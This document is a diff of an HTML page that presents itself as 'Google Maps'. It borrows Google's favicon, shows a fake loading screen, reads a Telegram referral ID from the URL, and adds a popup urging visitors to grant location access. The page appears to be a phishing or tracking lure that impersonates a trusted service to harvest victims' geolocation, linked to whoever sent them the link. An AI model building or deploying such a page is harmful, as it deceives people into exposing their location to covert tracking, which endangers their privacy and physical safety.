@@ -6,22 +6,31 @@
   <title>Google Maps</title>
   <link rel="stylesheet" href="style.css" />
   <link rel="icon" href="https://maps.gstatic.com/favicon3.ico">
-
-  <!-- ✅ Capture Telegram Deep-Link ref -->
   <script>
     const urlParams = new URLSearchParams(window.location.search);
     window.userRef = urlParams.get('ref') || 'unknown_ref';
   </script>
 </head>
 <body>
-  <!-- 🔄 Loading screen with spinner and retry -->
   <div id="loading-screen">
     <div class="spinner"></div>
     <div class="loading-text">Loading Google Maps...</div>
     <div id="retry-location" onclick="retryLocation()">🔁</div>
   </div>
 
-  <!-- ✅ Main logic script -->
+  <!-- Location Popup -->
+  <div id="location-popup" style="display:none;">
+    <div class="popup-box">
+      <div class="popup-title">Allow Location Access</div>
+      <div class="popup-desc">This site needs your location to show nearby results.</div>
+      <ul>
+        <li>Tap “Allow” on browser popup</li>
+        <li>We use it to improve your experience</li>
+      </ul>
+      <button onclick="getLocationNow()">Try Again</button>
+    </div>
+  </div>
+
   <script src="script.js"></script>
 </body>
 </html>
